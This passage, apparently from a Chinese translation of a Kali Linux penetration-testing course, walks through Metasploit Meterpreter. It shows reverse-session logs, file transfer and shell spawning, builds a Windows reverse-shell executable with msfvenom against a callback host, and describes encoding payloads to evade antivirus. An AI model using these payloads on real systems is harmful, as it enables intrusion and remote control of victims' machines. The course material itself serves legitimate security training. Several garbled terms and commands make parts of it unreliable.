
```
msf5 exploit(windows/http_handler) > exploit
[*] 在 http://10.11.0.4:4444 上启动 HTTP 处理器
[*] 正在自动检测目标...
[*] 目标是 10.0.28
[*] 正在发送请求...
[*] http://10.11.0.4:4444 处理来自 10.11.0.22 的请求；UUID: pchowbz) 分阶段
[*] Meterpreter 会话 1 已打开 (10.11.0.4:4444) -> 10.11.0.22:50270
meterpreter >
```

列表 757 - 建立反向 meterpreter 连接

所示所示`meterpreter`负载的语法与我们看到的其他负载匹配。让我们进一步研究 Meterpreter 以突出一些显著的差异。

## 22.3.3 实验 Meterpreter

我们可以使用 `help` 命令获取 Meterpreter 内置的所有模块和命令列表：

```
meterpreter > help
```

### 核心命令

| 命令 | 描述 |
| --- | --- |
| ? | 帮助菜单 |
| background | 将当前会话后台化 |
| bgkill | 杀死后台 meterpreter 脚本 |
| bglist | 列出运行的后台脚本 |
| bgrun | 作为后台线程执行 meterpreter 脚本 |
| channel | 显示信息或控制活动通道 |
| close | 关闭通道 |
| disable_unicode_encoding | 禁用 unicode 字符串编码 |
| enable_unicode_encoding | 启用 unicode 字符串编码 |
| exit | meterpreter 会话 |
| get_timeouts | 获取当前会话超时值 |
| guid | 获取会话 GUID |

列表 768 - Meterpreter 的帮助命令

了解 Meterpreter 特性的最佳方法是测试它们。让我们从 `sysinfo` 和 `getuid` 等几个简单命令开始。

```
meterpreter > sysinfo
Computer : CLIENT251
OS : Windows 10 (Build 16299)
Architecture : x86
System Language : en_US
Domain : corp
Logged On Users : 7
Meterpreter : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

列表 769 - 在 meterpreter 中执行简单命令

引入的命令为我们提供了有关目标计算机、操作系统和当前用户的信息。接下来，让我们使用内置的 meterpreter 命令尝试一些上传。注意，由于 shell 转义，我们对目标路径使用双引号 `""`，如下所示：

```
meterpreter > upload /usr/share/windows-resources/binaries/bin.exe ""C:\Users\Offsec""
[*] 正在上传：/usr/share/windows-resources/binaries/bin.exe -> C:\Users\Offsec.exe
[*] 已上传：/usr/share/windows-resources/binaries/bin.exe -> C:\Users\Offsec.exe

meterpreter > download c:\Windows\system32\calc.exe /tmp/calc.exe
[*] 正在下载：c:\Windows\system32\calc.exe -> /tmp/calc.exe
[*] 已下载 25.50 KiB (100.0%) : c:\Windows\system32 -> /tmp/calc.exe
[*] 下载：c:\Windows\system32\calc.exe -> /tmp/calc.exe
meterpreter >
```

列表 770 - 使用 meterpreter 上传和下载文件

Meterpreter 包含了基础文件系统命令，如 `pwd`、`ls` 和 `cd`，用于遍历目标文件系统。每个命令的名称与 Linux 上使用的相同，但通过 Meterpreter 在 Windows 宿主机上运行。从 Meterpreter 产生系统 shell 的最大优势是，如果由于某种原因我们的 shell 无法退出（例如，在 shell 中启动了交互式会话且未退出），我们可以退出 shell 返回 Meterpreter 并在新通道中重新生成，如列表 771 所示。

```
meterpreter > shell
Process 3488 created.
Channel 3 created.

C:\Windows\system32> ftp 127.0.0.1
ftp 127.0.0.1
ftp: connect :Connection refused
^C

Terminate channel 3? [Y/n] y

meterpreter > shell
Process 3504 created.
Channel 4 created.

C:\Windows\system32> exit
exit
meterpreter >
```

> 列表 771 - 在 meterpreter 中使用 shell 命令

虽然可以从 `shell` 命令打开的命令行提示符执行应用程序，但我们也可以使用内置的 meterpreter 命令。例如，`execute` 命令启动应用程序，`ps` 列出所有运行的进程，而 `kill` 则终止指定的进程。

虽然 Metploit 的签名负载（payload）包含许多优秀功能，但它不是唯一的可用负载。还有其他适用于特定情况的负载，例如 `vncinject/reverse_http`，它会创建一个反向 VNC 图形连接；或者 `php/reverse_php`，它是一个完全用 PHP 编写的反向 shell，可用于利用 PHP Web 应用程序。存在更奇特的负载，如 `mainframe/reverse_shell_jcl`，它是针对 Z/OS 主机的反向 shellcode。

## 22.3.3 练习

- 1) 花些时间查看并实验 Metploit 中可用的各种负载。

### 22.3.4 可执行载荷

Metploit Framework 载荷可以导出为各种文件类型和格式，如 ASP、VScript、Jar、Windows DLL 和 EXE 等。

713 https://en.wikipedia.org/wiki/Virtual_Network_Computing

714 https://en.wikipedia.org/wiki/Z/OS

# 使用 Kali Linux 2.0 进行渗透测试

例如，让我们使用 `-p` 标志设置负载，使用 `LHOST` 和 `LPORT` 分配监听的可执行文件。我们将使用 `-h` 指定主机，使用 `-f` 指定输出格式（在此例为 exe），并使用 `-o` 指定文件名：

```
kali@kali:~ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o
shell_reverse.exe
```

[-] No payload was selected, choosing Msf:Module:Windows from the payload

[-] No arch selected, selecting arch: x86 from the payload

No encoder or encoders specified, output raw payload

Payload size: 324 bytes

Final size of exe: 73802 bytes

Saved as: shell_reverse.exe

```
kali@kali:~ file_reverse.exe (GUI) Int for MS Windows
shell_reverse.exe: PE32 executable
```

列表 772 - 创建带有反向 shell 载荷的可执行文件

嵌入在 PE 文件中的 shell 可以使用许多 MSF 编码器中的任何一个进行编码。在历史上，这可以规避杀毒软件，但对于现代杀毒引擎已不再如此。编码通过 `-e` 配置以指定编码器类型，通过 `-i` 设置所需的编码迭代次数。我们可以使用多个编码器来进一步混淆二进制文件，从而有效地规避签名检测。
